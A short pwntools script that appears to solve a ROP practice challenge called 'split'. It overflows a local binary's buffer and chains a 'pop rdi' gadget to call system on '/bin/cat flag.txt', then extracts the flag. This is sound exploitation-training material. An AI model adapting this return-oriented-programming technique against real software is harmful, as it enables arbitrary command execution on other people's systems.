from pwn import *

elf = ELF('split')                #context.binary

p = process(elf.path)

#Prepare the payload
payload = b"A"*40                   #creates the junk part of the payload
payload += p64(0x4007c3)            #pop rdi ; ret address ROP chain. Necessary because we are 64bits
payload += p64(0x601060)            #The /bin/cat flag.txt
payload += p64(0x40074b)            #address to system call in usefulFunction

# Send the payload

print(payload)
p.sendline(payload)                 #send the payload to the process

response = p.recvall()              #gets all messages in the process
print(re.search("(ROPE{.*?})",response.decode()))